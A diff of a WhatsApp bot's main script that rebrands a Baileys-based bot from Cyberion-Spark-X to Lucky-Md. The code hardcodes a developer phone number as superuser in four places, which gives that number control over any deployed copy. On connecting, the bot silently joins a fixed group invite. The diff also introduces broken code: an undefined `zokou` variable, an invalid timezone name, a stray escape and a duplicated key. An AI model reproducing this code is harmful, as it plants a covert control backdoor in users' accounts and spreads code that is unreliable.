@@ -29,12 +29,12 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", { value: true });
 const baileys_1 = __importStar(require("@whiskeysockets/baileys"));
-const logger_1 = __importDefault(require("@whiskeysockets/baileys/lib/Utils/logger"));
+const logger_1 = __importDefault(require("@whiskeysockets/baileys/bdd/Utils/logger"));
 const logger = logger_1.default.child({});
 logger.level = 'silent';
 const pino = require("pino");
 const boom_1 = require("@hapi/boom");
-const conf = require("./config");
+const conf = require("./set");
 const axios = require("axios");
 const moment = require("moment-timezone");
 let fs = require("fs-extra");
@@ -43,20 +43,20 @@ let botPassword = null;
 const FileType = require('file-type');
 const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
 //import chalk from 'chalk'
-const { verifierEtatJid , recupererActionJid } = require("./lib/antilien");
-let evt = require(__dirname + "/Ibrahim/adams");
-const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./lib/banUser");
-const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./lib/banGroup");
-const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./lib/onlyAdmin");
+const { verifierEtatJid , recupererActionJid } = require("./bdd/antilien");
+let evt = require(__dirname + "/framework/zokou");
+const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./bdd/banUser");
+const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd/banGroup");
+const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
-let { reagir } = require(__dirname + "/Ibrahim/app");
+let { reagir } = require(__dirname + "/framework/app");
 const prefixe = conf.PREFIXE;
 const more = String.fromCharCode(8206)
 const BaseUrl = process.env.GITHUB_GIT;
 const adamsapikey = process.env.BOT_OWNER;
 const BaseUrl1 = process.env.MADE_IN_KENYA;
 const adamsapikey2 = process.env.BOT_NAME;
-require('dotenv').config({ path: './config.env' });
+require('dotenv').config({ path: './.env' });
 const herokuAppName = process.env.HEROKU_APP_NAME || "Unknown App Name";
 const herokuAppLink = process.env.HEROKU_APP_LINK || `https://dashboard.heroku.com/apps/${herokuAppName}`; 
 const botOwner = process.env.NUMERO_OWNER || "Unknown Owner"; 
@@ -153,10 +153,10 @@ authentification();
    store.bind(zk.ev);
 
 
-// Function to get the current date and time in Kenya
+// Function to get the current date and time in Tanzania
 function getCurrentDateTime() {
     const options = {
-        timeZone: 'Africa/Nairobi', // Kenya time zone
+        timeZone: 'Africa/Dar Es Salam', // Tanzania time zone
         year: 'numeric',
         month: '2-digit',
         day: '2-digit',
@@ -173,7 +173,7 @@ function getCurrentDateTime() {
 setInterval(async () => {
     if (conf.AUTO_BIO === "yes") {
         const currentDateTime = getCurrentDateTime(); // Get the current date and time
-        const bioText = `Cyberion-Spark-X is running 😎\n${currentDateTime}`; // Format the bio text
+        const bioText = `Lucky_Md is running 🚗\n${currentDateTime}`; // Format the bio text
         await zk.updateProfileStatus(bioText); // Update the bio
         console.log(`Updated Bio: ${bioText}`); // Log the updated bio
     }
@@ -188,7 +188,7 @@ setInterval(async () => {
 
     await zk.rejectCall(callId, callerId);
     await zk.sendMessage(callerId, {
-      text: "Hello🥹,am Cyberion-Spark-X a personal assistant,please try again later"
+      text: "Hello😊,am Lucky-Md a personal assistant,please try again later"
     });
   }
 });
@@ -220,8 +220,8 @@ const emojiMap = {
     "niaje": ["👋", "😄", "💥", "🔥", "🕺", "💃"],
     
     // Names (can be expanded with more names as needed)
-    "ibrahim": ["😎", "💯", "🔥", "🚀", "👑"],
-    "adams": ["🔥", "💥", "👑", "💯", "😎"],
+    "fredi": ["😎", "💯", "🔥", "🚀", "👑"],
+    "ezra": ["🔥", "💥", "👑", "💯", "😎"],
     
     // Expressions of gratitude
     "thanks": ["🙏", "😊", "💖", "❤️", "💐"],
@@ -719,7 +719,7 @@ if (conf.AUTO_REACT_STATUS === "yes") {
                 }
 
                 const adams = zk.user && zk.user.id ? zk.user.id.split(":")[0] + "@s.whatsapp.net" : null;
-                if (!adams) {
+                if (!zokou) {
                     console.log("Bot's user ID not available. Skipping reaction.");
                     continue;
                 }
@@ -735,7 +735,7 @@ if (conf.AUTO_REACT_STATUS === "yes") {
                             text: randomReaction,
                         },
                     }, {
-                        statusJidList: [message.key.participant, adams],
+                        statusJidList: [message.key.participant, zokou],
                     });
 
                     lastReactionTime = Date.now();
@@ -817,7 +817,7 @@ async function sendVCard(jid, baseName) {
             document: { url: vCardPath },
             mimetype: 'text/vcard',
             fileName: `${name}.vcf`,
-            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\n🙂CYBERION-SPARK-X`
+            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\N LUCKY MD👊`
         });
 
         console.log(`vCard created and sent for: ${name} (${jid})`);
@@ -841,7 +841,7 @@ zk.ev.on("messages.upsert", async (m) => {
     if (!ms.message) return;
 
     const origineMessage = ms.key.remoteJid;
-    const baseName = "🙂 Spark-X";
+    const baseName = "Lucky-Md";
 
     // Check if the message is from an individual and if contact is not saved
     if (origineMessage.endsWith("@s.whatsapp.net") && (!store.contacts[origineMessage] || !store.contacts[origineMessage].name)) {
@@ -853,7 +853,7 @@ zk.ev.on("messages.upsert", async (m) => {
         
         // Send additional message to inform the contact of their new saved name
         await zk.sendMessage(origineMessage, {
-            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\n🙂 CYBERION-SPARK-X`
+            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\nLUCKY_MD`
         });
 
         console.log(`Contact ${assignedName} has been saved and notified.`);
@@ -864,7 +864,7 @@ zk.ev.on("messages.upsert", async (m) => {
 
 
 // Default auto-reply message
-let auto_reply_message = "Hello,its Cyberion-Spark-X on board. My owner is currently unavailable. Please leave a message, and we will get back to you as soon as possible.";
+let auto_reply_message = "Hello,its Lucky Md on board. My owner is currently unavailable. Please leave a message, and we will get back to you as soon as possible.";
 
 // Track contacts that have already received the auto-reply
 let repliedContacts = new Set();
@@ -1030,9 +1030,9 @@ zk.ev.on("messages.upsert", async (m) => {
     "yoo": "files/mkuu.wav",
     "wazii": "files/mkuu.wav",
     "dev": "files/ibrahim.wav",
-    "ibraah": "files/ibrahim.wav",
-    "ibrah": "files/ibrahim.wav",
-    "ibrahim": "files/ibrahim.wav",
+    "fredie": "files/ibrahim.wav",
+    "ezra": "files/ibrahim.wav",
+    "fredie": "files/ibrahim.wav",
     "adams": "files/ibrahim.wav",
     "bot": "files/bwm.mp3",
     "bwm": "files/bwm.mp3",
@@ -1222,12 +1222,12 @@ if (conf.AUTO_TAG_STATUS === "yes") {
             }
             
             var membreGroupe = verifGroupe ? ms.key.participant : '';
-            const { getAllSudoNumbers } = require("./lib/sudo");
+            const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const abu1 = '254710772666';
-            const abu2 = '254710772666';
-            const abu3 = "254710772666";
-            const abu4 = '254710772666';
+            const abu1 = '255752593977';
+            const abu2 = '255752593977';
+            const abu3 = "255752593977";
+            const abu4 = '255752593977';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, abu1, abu2, abu3, abu4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -1368,7 +1368,7 @@ if (conf.AUTO_READ === 'yes') {
             
  //---------------------------------------rang-count--------------------------------
              if (texte && auteurMessage.endsWith("s.whatsapp.net")) {
-  const { ajouterOuMettreAJourUserData } = require("./lib/level"); 
+  const { ajouterOuMettreAJourUserData } = require("./bdd/level"); 
   try {
     await ajouterOuMettreAJourUserData(auteurMessage);
   } catch (e) {
@@ -1388,7 +1388,7 @@ if (conf.AUTO_READ === 'yes') {
             
                     if(superUser) {console.log('hummm') ; return ;} 
                     
-                    let mbd = require('./lib/mention') ;
+                    let mbd = require('./bdd/mention') ;
             
                     let alldata = await mbd.recupererToutesLesValeurs() ;
             
@@ -1567,7 +1567,7 @@ if (conf.AUTO_READ === 'yes') {
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./lib/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -1629,7 +1629,7 @@ if (conf.AUTO_READ === 'yes') {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Cyberion',
+                pack: 'FredieTech',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -1702,7 +1702,7 @@ if (conf.AUTO_READ === 'yes') {
             //execution des commandes   
             if (verifCom) {
                 //await await zk.readMessages(ms.key);
-                const cd = evt.cm.find((adams) => adams.nomCom === (com));
+                const cd = evt.cm.find((zokou) => zokou.nomCom === (com));
                 if (cd) {
                     try {
 
@@ -1757,7 +1757,7 @@ if (conf.AUTO_READ === 'yes') {
         //fin événement message
 
 /******** evenement groupe update ****************/
-const { recupevents } = require('./lib/welcome'); 
+const { recupevents } = require('./bdd/welcome'); 
 
 zk.ev.on('group-participants.update', async (group) => {
     console.log(group);
@@ -1840,7 +1840,7 @@ zk.ev.on('group-participants.update', async (group) => {
         
     async  function activateCrons() {
         const cron = require('node-cron');
-        const { getCron } = require('./lib/cron');
+        const { getCron } = require('./bdd/cron');
 
           let crons = await getCron();
           console.log(crons);
@@ -1858,7 +1858,7 @@ zk.ev.on('group-participants.update', async (group) => {
                   zk.sendMessage(crons[i].group_id, { image : { url : './files/chrono.webp'} , caption: "Hello, it's time to close the group; sayonara." });
 
                 }, {
-                    timezone: "Africa/Nairobi"
+                    timezone: "Africa/Dar Es Salam"
                   });
               }
         
@@ -1875,7 +1875,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
                  
                 },{
-                    timezone: "Africa/Nairobi"
+                    timezone: "Africa/Dar Es Salam"
                   });
               }
         
@@ -1892,25 +1892,25 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("Cyberion is connecting to your account...");
+                console.log("Lucky is connecting to your account...");
             }
             else if (connection === 'open') {
        
                       await zk.groupAcceptInvite("F5BXJci8EDS9AJ6sfKMXIS");
                      
-                console.log("Cyberion connected successfully✔");
+                console.log("Lucky connected successfully✔");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Cyberion is Online 🕸\n\n");
+                console.log("Lucky is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading Cyberion Commands ...\n");
-                fs.readdirSync(__dirname + "/scs").forEach((fichier) => {
+                console.log("Loading Lucky Commands ...\n");
+                fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
-                            require(__dirname + "/scs/" + fichier);
+                            require(__dirname + "/commandes/" + fichier);
                             console.log(fichier + " Installed Successfully✔️");
                         }
                         catch (e) {
@@ -1943,15 +1943,15 @@ zk.ev.on('group-participants.update', async (group) => {
 
 ║ Prefix: [ ${prefixe} ]
 ║ Mode: ${md}
-║ Model: Spark-X
-║ Bot Name: Cyberion-Spark-X 
-║ Owner: Dr.Carl William
+║ Model: Lucky_Md
+║ Bot Name: Lucky-Md-Bot 
+║ Owner: FrediEzra
 ╚═════ ❖ •✦
 -_-<-<-<-<-<-<-<--<-<-<-<-<-<
 
 *🪀Follow my channel for updates and free hacks🙃*
  
-> https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y
+> https://whatsapp.com/channel/0029VaihcQv84Om8LP59fO3f
 
 *Heroku App Configuration*
  
